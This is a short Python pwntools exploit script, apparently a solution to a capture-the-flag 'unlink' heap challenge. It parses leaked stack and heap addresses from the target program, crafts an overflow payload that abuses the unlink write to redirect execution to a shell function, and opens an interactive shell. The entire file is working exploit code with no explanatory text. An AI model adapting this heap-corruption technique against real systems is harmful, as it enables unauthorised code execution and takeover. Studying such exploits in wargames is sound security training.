#!/usr/bin/python

from pwn import *

r = process(['/home/unlink/unlink'])

stack = r.recvline().split(':')[1].strip()
heap = r.recvline().split(':')[1].strip()
print r.recvline()

shell = p32(0x80484eb)
pad = p32(0x00)
shell_ptr = p32(int(heap, 16)+0x8+0x4) # the value that gets deferenced in [ecx-0x4]
stack_write = p32(int(stack, 16)+0x10) # writing the heap ptr to stack

r.sendline(shell+pad+pad+pad+shell_ptr+stack_write)
r.interactive()

print r.recvline()

